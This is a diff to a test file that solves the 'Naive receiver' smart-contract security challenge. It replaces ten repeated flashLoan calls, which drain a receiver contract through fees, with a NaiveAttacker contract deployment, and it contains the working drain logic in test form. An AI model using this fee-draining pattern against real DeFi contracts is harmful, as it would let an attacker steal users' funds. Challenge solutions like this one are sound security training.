@@ -3,6 +3,7 @@ const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 
 const LenderPool = contract.fromArtifact('NaiveReceiverLenderPool');
 const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
+const AttackerContract = contract.fromArtifact('NaiveAttacker');
 
 const { expect } = require('chai');
 
@@ -36,16 +37,17 @@ describe('[Challenge] Naive receiver', function () {
 
     after(async function () {
         /** Will refacotre one day in 1 transaction with contract */
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
-        await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};        
+        await AttackerContract.new(this.receiver.address, this.pool.address, {from: attacker});
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};
+        // await this.pool.flashLoan(this.receiver.address, 1), {from: attacker};        
         expect(
             await balance.current(this.receiver.address)
         ).to.be.bignumber.equal('0');
